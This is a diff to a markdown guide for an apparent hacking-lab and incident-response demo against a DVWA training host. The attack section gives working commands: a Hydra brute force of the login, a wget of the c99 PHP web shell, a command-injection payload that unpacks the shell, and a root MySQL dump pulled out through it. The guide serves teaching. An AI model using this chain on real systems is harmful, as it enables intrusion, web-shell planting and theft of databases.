@@ -24,21 +24,21 @@ Intro to IR: https://docs.google.com/presentation/d/1URpDkIjIGJbsgWn-Dqu-diC3PAd
 ### Nikto scanner
 0. Spin up Kali Linux VM
 0. Open terminal
-0. nikto -host http://dvwa.hackinglab.beer
+0. `nikto -host http://dvwa.hackinglab.beer`
 
 ### Hydra brute force
 0. `hydra -l admin -P /usr/share/dirb/wordlists/small.txt dvwa.hackinglab.beer -s 8080 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V`
 
 ### Zip, upload and unzip c99.php
 0. `wget https://raw.githubusercontent.com/tennc/webshell/master/php/PHPshell/c99/c99.php`
-0. gzip -f c99.php
+0. `gzip -f c99.php`
 0. Browse http://dvwa.hackinglab.beer with CHROME and login
     1. User: admin
     1. Pass: password
 0. Select "Upload" on the left
 0. Select "Choose file", "c99.php.gz" then "Upload"
 0. Select "Command injection" on the right
-0. Enter "8.8.8.8; /bin/gunzip -v ../../hackable/uploads/c99.php" into "Enter ip address"
+0. Enter `8.8.8.8; /bin/gunzip -v ../../hackable/uploads/c99.php` into "Enter ip address"
 0. Browse to http://dvwa.hackinglab.beer:8080/hackable/uploads/c99.php
 
 ### Host situation awareness
@@ -51,15 +51,15 @@ Intro to IR: https://docs.google.com/presentation/d/1URpDkIjIGJbsgWn-Dqu-diC3PAd
 0. Get known hosts: arp -a
 
 ### Dump database
-0. mysql -u root -e "show databases;"
+0. `mysql -u root -e "show databases;"`
     1. There is no root password
-0. mysql -u root -e "use dvwa; show tables"
-0. mysqldump -u root --database dvwa
+0. `mysql -u root -e "use dvwa; show tables"`
+0. `mysqldump -u root --database dvwa > dump.sql`
+0. Use c99.php web shell to download dump
 
 ## Incident reponse demo
 ### Connecting to machine
-0. ssh 
-
+0. ssh guardian@dvwa.hackinglab.beer -p5000
 
 ### Understanding the machine
 It is important to understand the machine you are investigating
